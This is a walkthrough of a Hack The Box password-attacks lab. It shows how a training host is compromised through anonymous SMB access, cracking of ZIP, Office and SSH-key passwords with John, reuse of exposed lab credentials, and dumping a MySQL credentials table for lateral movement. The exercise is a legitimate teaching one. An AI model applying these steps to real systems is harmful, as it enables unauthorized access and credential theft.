# Password Attacks Lab - Medium  

[Password Attacks Lab - Medium](https://academy.hackthebox.com/module/147/section/1335)  

>Host is a workstation used by an employee for their day-to-day work. 
>These types of hosts are often used to exchange files with other employees and are typically administered by administrators over the network.
>During a meeting with the client, we were informed that many internal users use this host as a jump host. 
>The focus is on securing and protecting files containing sensitive information.  

## Enumeration  

>NMAP Scans and results:  

```
sudo nmap -p 22,139,445 10.129.202.221 -sCV -A -O

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SKILLS-MEDIUM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 1s
| smb2-time: 
|   date: 2023-07-16T17:43:55
|_  start_date: N/A
```  

### SMB  

>Enumerate if any shares allow anonymous or null unauthenticated read of data and files.

```
smbmap -u '' -H 10.129.202.221
```  

>Discovering a share `SHAREDRIVE` that allow read access anonymously.  

```
smbclient -N \\\\10.129.202.221\\SHAREDRIVE

get Docs.zip
```

>Extract the ZIP password hash, and then Crack password protected zip file using `John`.  

```
zip2john Docs.zip >docs.hash

john docs.hash --wordlist=resources/demo-pass.lst
```  

>Cracking the Office Document DOCX file password with `office2john`. [Cracking Documents](https://academy.hackthebox.com/module/147/section/1322)  

```
office2john Documentation.docx >office.hash

john office.hash --show
```

>Office DOCX file password cracked as `987654321`, and discover the Microsoft Word Document content as below.  

![office2john-Password-Attacks-Lab-Medium](/images/office2john-Password-Attacks-Lab-Medium.png)  

>Discovered password information from word document, as below:  

```

Root password is jason:C4mNKjAtL2dydsYa6
>10.129.200.21</inlane.configure.localIp>

http://localhost:8080/cms 
```  

## Foothold

>Gain access to target as `jason` via ssh with the password `C4mNKjAtL2dydsYa6`.  

>Based on the document discovered, enumeration indicate local internal HTTP service on port 8080.

### Local Service Discovery  

>[Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426)  
>`netstat` and `ss` commands to determine internal ports not accessible on victim from kali externally.   

```
netstat -antup

ss -tulpn
```  

![netstat-Password-Attacks-Lab-Medium](/images/netstat-Password-Attacks-Lab-Medium.png)  

>Discovered MySQL on port 3306 internally.
>Using credentials for `jason` and password of `C4mNKjAtL2dydsYa6` to connect locally to SQL.  

```
mysql -u jason -p

show databases;
use users;
show tables;

select * from creds where name like 'dennis';
```  

![SQL-Password-Attacks-Lab-Medium](/images/SQL-Password-Attacks-Lab-Medium.png)  

## Lateral Movement  

>Logged in as `dennis` user with the discovered crednetials on the internal MySQL service, creds table.

```
su dennis

cd /home/dennis/.ssh
cat id_rsa
```   

>Crack the id_rsa key password for `dennis` using John.  

```
ssh2john id_rsa_dennis.ssh > ssh.hash

john ssh.hash --wordlist=../mut_password.list

ssh dennis@10.129.202.221 -i id_rsa_dennis.ssh
```




